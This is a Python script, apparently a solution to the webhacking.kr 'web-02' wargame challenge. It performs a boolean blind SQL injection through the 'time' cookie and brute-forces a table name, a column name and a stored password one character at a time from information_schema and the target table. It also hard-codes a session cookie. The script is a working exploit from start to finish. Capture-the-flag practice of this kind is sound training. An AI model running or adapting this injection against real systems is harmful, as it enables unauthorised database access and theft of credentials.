import string
import requests

url = "https://webhacking.kr/challenge/web-02/"
cookie = {"PHPSESSID":"b04b5c5l7ekrjp3ct3bm4n3kmn","time":""}

def find_tb():
    tb_name = ""
    for i in range(1,14):
        for j in string.printable:
            cookie["time"] = "((select substr(table_name,{},1) from information_schema.tables where table_schema = database() limit 0,1) = '{}')".format(i,j)
            res = requests.get(url,cookies=cookie)
            if "09:00:01" in res.text:
                tb_name += j
                print("FOUND TABLE NAME : " + tb_name)
                break
    print("[+] TABLE NAME : " + tb_name)
    return tb_name

def find_col(tb_name):
    col_name = ""
    for i in range(1,3):
        for j in string.printable:
            cookie["time"] ="((select substr(column_name,{},1) from information_schema.columns where table_name ='{}') = '{}')".format(i,tb_name,j)
            res = requests.get(url,cookies=cookie)
            if "09:00:01" in res.text:
                col_name += j
                print("FOUND COLUMN NAME : " + col_name)
                break
    print("[+] COLUMN NAME : " + col_name)
    return col_name

def find_pw(col_name,tb_name):
    pw = ""
    for i in range(1,18):
        for j in string.printable:
            cookie["time"] ="((select substr({},{},1) from {}) = '{}')".format(col_name,i,tb_name,j)
            res = requests.get(url,cookies=cookie)
            if "09:00:01" in res.text:
                pw += j
                print("FOUND PASSWORD : " + pw)
                break
    print("[+] PASSWORD : " + pw)

if __name__ == "__main__":
    tb_name = find_tb()
    col_name = find_col(tb_name)
    find_pw(col_name,tb_name)
